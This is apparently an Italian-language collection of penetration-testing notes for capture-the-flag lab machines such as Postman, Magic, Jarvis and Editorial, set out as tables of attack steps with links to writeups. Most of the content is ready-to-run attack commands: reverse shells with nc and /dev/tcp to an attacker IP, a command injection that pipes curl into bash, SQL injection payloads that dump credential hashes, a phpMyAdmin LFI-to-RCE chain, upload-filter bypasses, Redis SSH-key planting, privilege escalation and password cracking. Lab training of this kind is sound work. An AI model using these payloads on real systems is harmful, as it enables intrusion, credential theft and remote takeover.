| **Redis 4.0.9** | 1. `ssh-keygen -t rsa -b 4096 -C "redis@kali"`<br>2. `(echo -e "\n\n"; cat id_rsa.pub; echo "\n\n") > pwn.txt`<br>3. `redis-cli -h IP_TARGET flushall`<br>4. `cat pwn.txt \| redis-cli -h IP_TARGET -x set crackit`<br>5. `telnet IP_TARGET PORT`<br>6. `config set dir /var/lib/redis/.ssh`<br>7. `config set dbfilename authorized_keys`<br>8. `save`<br>9. `quit`<br>10. `ssh redis@1IP_TARGET -i id_rsa` | `Redis 4.0.9` √® vulnerabile a RCE secondo questa [guida](https://m0053sec.wordpress.com/2020/02/13/redis-remote-code-execution-rce/). Creiamo una chiave ssh pubblica per l'utente redis e la carichiamo sulla macchina target. |
| **Cracking**    | 1. `ssh2john id_rsa > hash`<br>2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`                                                                                                                                                                                                                                                                                                                    | in `/opt/id_rsa.bak` troviamo la chiave privata di `Matt`. La cracchiamo per trovare il passphrase. Il passphrase corrisponde alla sua password `Matt:computer2008`                                                             |
| **Webmin**      |                                                                                                                                                                                                                                                                                                                                                                                                              | Le credenziali di `Matt` possono essere riusate per sfruttare la [CVE-2019-12840](https://www.exploit-db.com/exploits/46984) associata a Webmin 1.910 per diventare root                                                        |
- [writeup](https://medium.com/meetcyber/htb-walkthrough-postman-1b2d253cd1a5)

### ScriptKiddies

| üß† Azione                | üíª Comando / Metodo                                                                                 | üìù Output / Scopo                                                                                |
| ------------------------ | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **APK reverse shell**    | 1. `searchsploit msfvenom`<br>2. `searchsploit -m 49491.py`<br>3. *INSERISCO:*`curl IP_TARGET:PORT` | Sulla porta `5000` posso caricare un file *.apk* che una volta che creo e testo con un curl *3.* |
| **Inseriamo il file**    | `nc -lvnp 4444`                                                                                     | Carichiamo il file *.apk* che fa una reverse shell                                               |
| **Privilege Escalation** | `echo "abc def ;curl IP_TARGET:PORT/shell.sh \| bash #" >> hackers`                                 | il file `/home/pwn/scanlosers.sh` √® vulnerabile a *Command Injection*                            |
| **Root**                 | 1. `sudo -l`<br>2. `sudo /opt/metasploit-framework-6.0.9/msfconsole`<br>3. `/bin/sh`                |                                                                                                  |
- [writeup](https://simardeep-singh.medium.com/hackthebox-writeup-script-kiddie-72b4a0f102bf)

### Magic

| üß† Azione            | üíª Comando / Metodo                                                                                                                           | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Reindirizzamento** |                                                                                                                                               | Notiamo che quando tentiamo di accedere alla cartella `/upload` ci rimanda in login. Per bypassare l'ostacolo catturiamo la richiesta e cambialo la risposta del server a `200 OK`. Adesso possiamo caricare file                                                                                                                                                                                                                                                                                               |
| **File upload**      | 1. `hexeditor -b revshell.jpg`<br>2. `CTRL+A`<br>3. `FF D8 FF E0`<br>4. `Content-Type: image/jpeg`<br>5.`namefile=reveshell.php.jpeg`         | Il server accetta solo file con estensione `.jpeg` dunque per bypassare il controllo utilizziamo la *1.*,*2.* e *3.* per cambiare i primi esadecimali del file, il *4.* per cambiare il `Content-Type` ed il *5.* per il filename. Proprio come ci dice questa guida sul [File Upload](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/).<br>In `revshell.php.jpg` c'√® la [Reverse Shell PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) |
| **MySQL**            | `mysqldump --databases -u theseus -p`                                                                                                         | Una volta entrati troviamo il file `db.php5` dove sono presenti le credenziali al DB `theseus:iamkingtheseus`. Con la *1.* scarichiamo tutto il contenuto del database e troviamo le credenziali `admin:Th3s3usW4sK1ng`                                                                                                                                                                                                                                                                                         |
| **SUID**             | 1. `find / -group GROUP 2>/dev/null`<br>2. `strace -f FILE_SUID`<br>3. `export PATH=/tmp:$PATH`<br>4. *CREIAMO REV SHELL*<br>5. `./FILE_SUID` | Con la *1.* troviamo i file SUID utilizzati dallo stesso gruppo dell'utente che abbiamo in possesso. Con la *2.* le funzioni di sistema utilizzate dal file SUID. Tra queste troviamo `execve()` che esegue il binario `free` senza l'uso del path assoluto dunque potremmo modificare la variabile PATH come in *3.* Creiamo la reverse shell ed eseguiamo il FILE_SUID che richiamer√† il nostro binario malevolo                                                                                              |
- [writeup](https://medium.com/@onurinalkac/hack-the-box-magic-writeup-4346e961e06f)


### Payday
| üß† Azione             | üíª Comando / Metodo                      | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| --------------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CS-Cart 1.3.3**     |                                          | Nel web √® presente *CS-Cart 1.3.3* che √® vulnerabile a [Upload File](https://www.exploit-db.com/exploits/48891) ma io uso questo [guida](https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c) perch√© √® pi√π dettagliata. Entro come utente amministratore con credenziali standard `admin:admin` e carico la [reverse-shell di pentest monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) |
| **Reused credential** | 1. `mysql -u root -p`<br>2. `su patrick` | Controllando con la *1.* il database con credenziali `root:root` noto che tutti gli utenti hanno password uguale al nome utente pertanto provo `patrick:patrick` ed ottengo la nuova utenza                                                                                                                                                                                                                                                         |
| **SUDO**              | `sudo su`                                | Con l'utente `patrick` vedo che ho tutti i permessi SUDO e quindi divento root                                                                                                                                                                                                                                                                                                                                                                      |
- [writeup](https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-payday-639f5128b0ca)

### Mzavee

| üß† Azione                | üíª Comando / Metodo                                                                                       | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------------ | --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Magic Number MZ File** | 1. `hexeditor -b rev_shell.php`<br>2. `CTRL + A`<br>3. `4D 5A`                                            | Con un fuzzing directories notiamo che √® presente una cartella `/backups` dove √® possibile scaricare un file `.zip`. Estraendo il file possiamo vedere il codice della pagina `upload.php`: accetta solo file con magic number `MZ 4D5A`.<br>Scarichiamo la *reverse shell pentestmonkey*, applichiamo la *1.* per cambiare il magic number in `4D5A` *3.*                                        |
| **Upload File**          | 1. `Content-type: application/vnd.microsoft.portable-executable`<br>2. `nc -lvnp LPORT`                   | Carichiamo il file con il nome `rev_shell.php` e cambiamo il `Content-type:` come in *1.*. Adesso mettiamo in ascolto con la *2.* e navighiamo il file caricato in `/upload/rev_shell.php`                                                                                                                                                                                                        |
| **SUID**                 | 1. `find / -perm -4000 -ls 2>/dev/null`<br>2. `./fileS --help`<br>3. `./find . -exec /bin/sh -p \; -quit` | Con la *1.* vediamo i file SUID e notiamo un file di nome `/opt/fileS`. Giocandoci un p√≤ proviamo la *2.* e scopriamo un manuale che porta a questo [link](http://192.168.147.33/backups/) dov'√® fatto un riferimento al binario `find`.<br>Sapendo che il file utilizza `find` proviamo la *3.* come consigliato da [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) e diventiamo root |


- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-ctf-200-02-6b114263cd04)
### Lazy admin

| üß† Azione            | üíª Comando / Metodo                                                                                                | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                          |
| -------------------- | ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Sweet Rice 1.5.1** | 1. `strings FILE \| grep -i pass -A 5 -B 5`                                                                        | Con un fuzzing directories scopriamo la cartella `/content` che contiene un riferimento al servizio *SweerRice 1.5.1*. La [CVE](https://www.exploit-db.com/exploits/40718) fa riferimento al path<br>`/inc/mysql_backup` dov'√® presente il backup del database.<br><br>Con la *1.* analizziamo il file e troviamo le credenziali dell'amministratore `manager:Password123` |
| **File Upload**      | 1. `python3 40716.py`                                                                                              | Secondo questa [CVE](https://www.exploit-db.com/exploits/40716) possiamo caricare la reverse shell di pentestmonkey e caricarla in formato `.phtml`                                                                                                                                                                                                                        |
| **SUDO**             | 1. `echo -e "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI LPORT >/tmp/f" > reverse.sh` | Notiamo che tra i file SUDO √® presente un file che avvia un secondo file `/etc/reverse.sh`. Sul secondo file abbiamo i permessi di scrittura quindi applichiamo la *1.*                                                                                                                                                                                                    |


### Rootme

| üß† Azione       | üíª Comando / Metodo                                           | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                        |
| --------------- | ------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **File Upload** |                                                               | Con un fuzzing directories troviamo la cartella `/panel` e `/uploads`. Nella prima √® possibile caricare file e nella seconda vederli sul web.<br><br>Carichiamo la reverse shell pentestmonkey in formato `.phtml` e cambiamo il MIME in `Content-Type: image/jpeg`. Navighiamo `/uploads/shell.phtml` e siamo dentro la macchina target |
| **SUID**        | 1. `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` | Tra i file SUID appare `python`, seguendo la guida di [GTFObins](https://gtfobins.github.io/gtfobins/python/#suid) diventiamo root                                                                                                                                                                                                       |

### Wallpaper Hub

| üß† Azione       | üíª Comando / Metodo                                                                                                                                                                                                                                                                               | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **File Upload** | 1. `sqlite3 database.db`<br>2. `hashcat -m 3200 hash rockyou.txt`                                                                                                                                                                                                                                 | Sulla porta `5000` √® presente un servizio per caricare i nostri file ed in seguito √® possibile scaricarli.<br>Se catturiamo la richiesta ed al posto del nome inseriamo `filename=../../../../../../../../../etc/passwd` √® vulnerabile a LFI. Otteniamo l'utente `wp_hub`. Facendo lo stesso con `filename=../../../../../../../../../home/wp_hub/.bash_history` notiamo che l'utente fa riferimento a `sqlite3 ~/wallpaper_hub/database.db` quindi scarichiamo il database con `filename=../../../../../../../../../home/wp_hub/wallpaper_hub/database.db` ed apriamolo con la *1.* e cracchiamo le pass con la *2.*<br><br>NB: poich√© dalla scansione si evince che utilizza `Werkzeug/3.0.1 Python/3.12.3` avremmo potuto ottenere le stesse info in `filename=../../../../../../../../../proc/self/cwd/app.py` ed evincere dalle librerie importate  il seguente path `filename=../../../../../../../../../proc/self/cwd/db.py` |
| **SUDO**        | 1. `echo "chmod 4777 /bin/bash" > /tmp/pwn`<br>2. `chmod +x /tmp/pwn`<br>3. ``echo "\`<script src=\"http://IP_KALI:LPORT/'+require('child_process').execSync('/tmp/pwn')+'\"></script>\`" > /tmp/pwn.html``<br>4. `sudo -u root /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/pwn.html` | Tra i permessi sudo possiamo eseguire `/usr/bin/web-scraper /root/web_src_downloaded/*.html`. Vediamo che il file `/usr/bin/web-scraper` √® un symlink del file `/opt/scraper/scraper.js` che leggendolo attentamente notiamo che importa il modulo `happy-dom` che √® vulnerabile a [Command Injection](https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065).<br>Utilizziamo la *1.* e *2.* per creare un file che dia i permessi SUID al `/bin/bash` infine la *3.* come command injection per avviare il file appena creato. Avviamo con la *4.* e con la *5.* diventiamo root                                                                                                                                                                                                                                                                                                                                                  |

- [writeup](https://www.youtube.com/watch?v=3UOPCjPSegc&ab_channel=thomasthecat)

### Zab

| üß† Azione               | üíª Comando / Metodo                                                                                                 | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                               |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Mage AI**             |                                                                                                                     | Sulla porta `6789` troviamo il servizio *Mage AI* dove √® possibile accedervi senza l'utilizzo di credenziali. Con un fuzzing directories troviamo il percorso `/files` dove possiamo caricare file a nostro piacimento. Notiamo che i file caricati qui vengono utilizzati sulla porta `80` quindi carichiamo una reverse shell in PHP e navighiamo `/rev.php` sulla porta `80` |
| **Zabbix Config Files** | 1. `mysql -u zabbix -p`<br>2. `john hash --wordlist=rockyou.txt`                                                    | Sul percorso `/etc/zabbix/web/zabbix.conf.php` troviamo le credenziali al DB, entriamo con la *1.* e troviamo le credenziali hashate degli utenti. Utilizziamo la *2.* per craccarle                                                                                                                                                                                            |
| **Zabbix**              | 1. *KALI* `./chisel server --reverse --port 9002`<br>2. *TARGET* `./chisel client IP_KALI:9002 R:8888:127.0.0.1:80` | Leggendo il file `/usr/share/zabbix/ui/conf/maintanace.php` notiamo che non √® possibile accedere al servizio *Zabbix* dall'esterno dunque dobbiamo usare la *1.* sulla nostra kali per creare il server di chisel e la *2.* sulla macchina target per forwardare la porta. Adesso il servizio gira sulla nostra porta `localhost:8888`                                          |
| **RCE**                 | ![[Pasted image 20250706205433.png]]<br>![[Pasted image 20250706205504.png]]                                        | Possiamo usare le credenziali trovate nel DB per entrare. Seguire le immagini                                                                                                                                                                                                                                                                                                   |
| **SUDO**                | 1. `sudo /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`                                              | Con i permessi SUDO possiamo eseguire `rsync` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/rsync/#sudo) √® vulnerabile. Utilizziamo la *1.* per diventare root                                                                                                                                                                                                     |

- [writeup](https://medium.com/@gayemans1003/offsec-proving-grounds-zab-walkthrough-4092a2c8c904)

### Zipper

| üß† Azione      | üíª Comando / Metodo                                                                                                                                    | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Upload zip** | 1. `/index.php?file=php://filter/convert.base64-encode/resource=index`<br>2. `/index.php?file=zip:///var/www/html/uploads/upload_1752240838.zip%23rev` | Sulla pagina principale vediamo che possiamo caricare file, ma un avviso dice che verranno cambiati in formato `.zip` e rinominati.<br>Con un fuzzing directories notiamo una cartella di nome `/uploads` e se cerchiamo il nome del file caricato notiamo che appare una schermata totalmente bianca, ci√≤ significa che il file viene trovato ma non stampato a schermo.<br>Utilizziamo wrapper PHP come la *1.* possiamo stampare a schermo i file in formato *base64* mentre con la *2.* eseguirli. Inseriamo una reverse shell in PHP ed eseguiamola |
| **Pspy**       |                                                                                                                                                        | Una volta dentro eseguiamo `pspy64s` e notiamo che un processo viene eseguito con le credenziali root                                                                                                                                                                                                                                                                                                                                                                                                                                                    |


- [writeup](https://h8handles.medium.com/zipper-proving-grounds-writeup-86317b1748c1)
  
### Pilgrimage
  
| **üß† Azione** | **üíª Comando / Metodo**                                                                                                                      | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **GitHub**    | 1. `python3 git_dumper.py http://pilgrimage.htb/.git/ dump`                                                                                  | Con un fuzzing directories troviamo la cartella `/.git` quindi adesso scarichiamo [git_dumper.py]() e poi utilizziamo la *1.* clonare il sito                                                                                                                                                                                                                                                                                                                                    |
| **Magick**    | 1. `python3 generate.py -f "/etc/passwd" -o test.png`<br>2. `identify -verbose DONWLOAD_IMAGE`<br>3. ![[Pasted image 20250813132905.png]]    | Tra le funzioni utilizzate troviamo [magick](https://github.com/Sybil-Scan/imagemagick-lfi-poc) che √® vulnerabile. Scarichiamo lo script e poi utilizziamo la *1.* e poi la carichiamo sul sito, la scarichiamo in locale ed utilizziamo *2.*. Traduciamo dall'esadecimale con la *3.*                                                                                                                                                                                           |
| **Pspy64s**   | 1. ![[Pasted image 20250813160747.png]]<br>2. `python3 exploit.py image.png IP_KALI LPORT`<br>3. `chmod 777 image.png`<br>4. `nc lvnp LPORT` | Scarichiamo `pspy64s` sulla macchina target e lo avviamo. Notiamo dalla *1.* che il root esegue il file `malware.sh`. Leggendo il contenuto del file notiamo che viene eseguito il comando `binwalk 2.3.2`. La versione √® vulnerabile a RCE secondo [CVE-2022-4510](https://www.exploit-db.com/exploits/51249).<br><br>Creiamo un file immagine con la *2*. Carichiamo il file nel path dove viene eseguito, diamogli tutti i permessi con la *3.* ed attendiamo che si connetta |


- [writeup](https://medium.com/@pk2212/htb-pilgrimage-walkthrough-06cfe394f917)

### Help

| **üß† Azione**                    | **üíª Comando / Metodo**                             | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                      |
| -------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HelpDesk Z 1.0.2 File Upload** | 1. `python3 exploit.py http://help.htb reverse.php` | Sulla porta principale troviamo il servizio *HelpDesk Z*, googlando "HelpDesk Z gihub" troviamo questo [link](https://github.com/helpdesk-z/helpdeskz-dev) dove scopriamo che se navighiamo `http://help.htb/README.md` scarichiamo il file da cui ci ricaviamo la versione *HelpDesk 1.0.2* che √® vulnerabile a [File Upload](https://www.exploit-db.com/exploits/40300). |
| **Kernel Exploit**               | 1. `gcc exploit.c -o output`<br>2. `./output`       | Una volta controlliamo la versione del Sistema Operativo `Linux Kernel 4.13.9` e scopriamo che √® vulnerabile a [CVE-2017-16995](https://www.exploit-db.com/exploits/45010)                                                                                                                                                                                                 |


- [writeup](https://www.youtube.com/watch?v=XB8CbhfOczU&t=1596s&ab_channel=IppSec)

## User Enumeration

### Sunday

| üß† Azione                    | üíª Comando / Metodo                                                                                                   | üìù Output / Scopo                                                                                                                                                                                                                      |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fingerprint**              | `perl finger-user-enum.pl -U /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt -t IP_TARGET`<br>         | Il target espone la porta `79 finger` che permette *1.* user enumeration. <br>Troviamo che esistono gli utenti `sunny` e `sammy`.<br>Provando le credenziali dell'hostname della macchina (`sunny:sunday`) riusciamo ad entrare su SSH |
| **Cracking shadow password** | 1. `unshadow passwd.txt shadow.txt > john-input`<br>2. `john --wordlist=/usr/share/wordlists/rockyout.txt john-input` | In `.bash_history` notiamo che esiste un file di backup per le password shadow accessibile da sunny. Copiamo il contenuto di passwd e shadow per poterlo craccare con `john`.<br>Troviamo le credenziali `sammy:cooldude!`             |
| **Root**                     | `sudo -l`                                                                                                             | Tra i comandi sudo troviamo che `wget` √® vulnerabile secondo [GTFObins](https://gtfobins.github.io/gtfobins/wget/#sudo)                                                                                                                |
- [writeup](https://systemweakness.com/htb-sunday-oscp-prep-b476a208b1d8)

## Heartbleed
### Valentine

| üß† **Azione**   | üíª **Comando / Metodo**                                      | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                  |
| --------------- | ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Heartbleed**  | 1. `python heartbleed.py -n 100 IP_TARGET`                   | Notiamo che l'applicazione web utilizza il protocollo *TLS* e testandolo scopriamo che √® vulnerabile a [Heartbleed](https://gist.github.com/eelsivart/10174134) pertanto scarichiamo facciamo il dump sulla memoria e troviamo delle credenziali.                                                                                                                      |
| **RSA privata** | 1. `ssh -i id_rsa hype@IP_TARGET`                            | Nel percorso `/dev/hype_key` troviamo la RSA privata dell'utente *hype* cifrata in esadecimale. Decifrandola proviamo ad entrare in SSH                                                                                                                                                                                                                                |
| **Root**        | 1. `ps -aux \| grep -i root`<br>2. `tmux -S /.devs/dev_sess` | Dal `.bash_history` notiamo che l'utente pu√≤ eseguire il comando `tmux` che avvia un terminale multiplexer ovvero accessibile da pi√π utenti. Applicando la *1.* notiamo che il terminale √® stato avviato dal `root` perci√≤ possiamo collegarci e quindi fare [Privilege Escalation](https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0) |
- [writeup](https://bigb0sss.github.io/posts/htb-valentine-writeup/)

## SSRF

### Forge

| üß† **Azione**  | üíª **Comando / Metodo**                                                                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SSRF**       |                                                                                                                                                                                      | Tramite fuzzing directories troviamo il percorso `/upload` dove possiamo sia caricare file e farci restituire il link di dove viene caricata e sia indirizzare richieste URL                                                                                                                   |
| **subdomains** | 1. `ffuf -u http://FUZZ.forge.htb -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.forge.htb"`<br>2. `http://ADMIN.FORGE.HTB/` | Cerchiamo sottodomini e troviamo `admin.forge.htb` ma √® accessibile solo tramite localhost.<br>Per bypassare i controlli utilizziamo l'input visto poc'anzi per indirizzare l'URL verso s√© stessa inserendo in input la *2.*                                                                   |
| **SSH**        | 1. `http://ADMIN.FORGE.HTB/upload?u=ftp://USER:PASS@FORGE.HTB/.ssh/id_rsa`<br>2. `ssh -i id_rsa USER@forge.htb`                                                                      | Con il `curl` *1.* abbiamo l'HTML della pagina e riusciamo a vedere delle credenziali ed un parametro `?u` da inserire nell'endpoint `/uploads`. Sfruttiamo la nozione per accedere a ftp e ricavarci la chiave privata                                                                        |
| **SUDO**       | 1. `sudo -l`<br>2. `sudo /usr/bin/python3 /opt/remote-manage.py`<br>3. `CARATTERE CASUALE`<br>4. `/bin/bash`                                                                         | Con la *1.* notiamo che l'utente pu√≤ avviare un file con permessi `root` che attende la connessione in una porta. Ci colleghiamo con una seconda sessione di ssh alla porta e poich√© il file importa la libreria `pdb` se causiamo errore avvier√† una shell di debugging con privilegi elevati |

- [writeup](https://medium.com/@onurinalkac/hackthebox-31-forge-writeup-d1119ac7315f)


### Editorial

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                             |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SSRF**      | 1. ![[Pasted image 20250819213527.png]]<br>2. ![[Pasted image 20250819213702.png]]                                                                                                                 | Sulla porta principale notiamo che il servizio accetta URL come parametri d'input e ci√≤ ci fa pensare ad enumerare le porte interne tramite *Burp Intruder* come nella *1.*. Scopriamo che la porta `5000` √® aperta e ci restituisce un link *2.* |
| **API**       |                                                                                                                                                                                                    | Dal secondo link ci ricaviamo un link che ci rimanda ad un file con credenziali. Effettuiamo l'accesso con SSH                                                                                                                                    |
| **Git**       | 1. `git log`<br>2. `git show MD5`                                                                                                                                                                  | L'utente attuale ha accesso alla cartella `/apps` dove possiamo enumerarla tramite *1.* e *2.* da dove ci ricaviamo altre credenziali `prod:PASS`                                                                                                 |
| **SUDO**      | 1. `echo "bash -i >& /dev/tcp/IP_KALI/LPORT >0&1" > /tmp/rootshell.sh`<br>2. `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ‚Äòext::sh -c bash /tmp/rootshell.sh‚Äô`<br> | L'utente `prod` pu√≤ eseguire uno script presente sulla macchina che esegue `from git import Repo` che √® vulnerabile [CVE-2022‚Äì24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858). Utilizziamo la *1.* e *2.* per diventare root  |

- [writeup](https://systemweakness.com/htb-editorial-machine-walkthrough-explanation-055fed9a2bed)

## Git

### GitHappens

| üß† **Azione**  | üíª **Comando / Metodo**                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                      |
| -------------- | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Git**        | 1. `./gitdumper.sh http://IP_TARGET .`                  | Tramite un fuzzing directories troviamo la cartella `/.git`. Scarichiamo il tool [gitdumper](https://github.com/internetwache/GitTools) con `git clone`. Utilizziamo la *1.*                                                                                               |
| **Git Status** | 1. `git status`<br>2. `git log`<br>3. `git show COMMIT` | Per controllare gli ultimi aggiornamenti di ci√≤ che abbiamo scaricato utilizziamo la *1.*. Utilizziamo la *2.* per vedere che operazioni sono state fatte. Vediamo che un'operazione √® interessante dunque approfondiamo con la *3.* dove troviamo le credenziali di login |

- [writeup](https://medium.com/@rizzziom/git-happens-walkthrough-tryhackme-3b51e4769f27)

## SQL Injection

### Jarvis

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                   |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQLi detection**    | `?cod=3-1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Navigando per il sito troviamo che per recuperare delle risorse il sito utilizza un parametro di nome `?cod=`. Applicando delle operazioni di sottrazione come in *1.* capiamo che √® vulnerabile a SQL Injection                                                                                                                                                                                        |
| **SQLi exploitation** | 1. `?cod=1 union select 1`<br>2. `?cod=1 union select 1,2`<br>(...)<br>3. `?cod=1 union select 1,2,3,4,5,6,7`<br>4. `?cod=123 union select 1,2,"TEST",4,5,6,7`                                                                                                                                                                                                                                                                                                                                              | Testando il parametro `?cod=` capiamo con le `UNION` che accetta 7 parametri del quale solo il cambiando il terzo in carattere otteniamo un errore diverso dagli altri. Se il terzo parametro accetta caratteri significa che lo possiamo utilizzare per l'exploitation                                                                                                                                 |
| **Credenziali**       | 1. `?cod=123+union+select+1,2,(select+SCHEMA_NAME+from+Information_Schema.SCHEMATA+LIMIT+0,1),4,5,6,7`<br>2. `?cod=123+union+select+1,2,(select+group_concat(SCHEMA_NAME,":")+from+Information_Schema.SCHEMATA),4,5,6,7`<br>3. `?cod=123+union+select+1,2,(select+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'hotel'),4,5,6,7`<br>4. `?cod=123+union+select+1,2,(select+group_concat(host,":",user,":",password,"\r\n")+from+mysql.user),4,5,6,7` | Aiutandoci con [PentestMonkey SQLi cheatsheet per MySQL db](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) possiamo recuperare informazioni dal database. Otteniamo le credenziali `DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`                                                                                                                            |
| **Cracking**          | `hashcat -m 300 hash /usr/share/wordlists/rockyou.txt`                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Cercando su *MySQL* su [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes) troviamo che il codice corrispondente √® *300*                                                                                                                                                                                                                                                                 |
| **PHPMyAdmin 4.8.0**  | 1. `select '<?php phpinfo();exit;?>'`<br>2. `IP_TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_pe39qj4g9ehq1n10dm1m5v6tsivkbffd`<br>3. `select '<?php exec("wget -O /var/www/html/revshell.php http://IP_TARGET/revshell.php"); ?>'`<br>4. `IP_TARGET/revshell.php`                                                                                                                                                                                         | Una volta autenticati su *PHPMyAdmin* utilizziamo la guida per [PHPMyAdmin RCE](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/).<br>Con la *1.* capiamo che √® vulnerabile a RCE e con la *2.* capiamo che √® vulnerabile a LFI; ci sono tutti i requisiti per caricare una shell ed eseguirla.<br>Con la *3.* carichiamo una *PHP reverse shell* e con la *4.* la eseguiamo |
| **Pepper user**       | 1. `sudo -l`<br>2. `sudo -u pepper /var/www/simpler.py -p`<br>3. `$(/tmp/rev_shell.sh)`                                                                                                                                                                                                                                                                                                                                                                                                                     | Con la *1.* controlliamo i permessi sudo e notiamo che possiamo eseguire come utente pepper un file in python. Leggendo il file python notiamo che inserendo il parametro `-p` possiamo utilizzare la funzione `exec()` che serve ad utilizzare comandi del sistema, dunque usiamo la *3.* per avviare una reverse shell scritta da noi                                                                 |
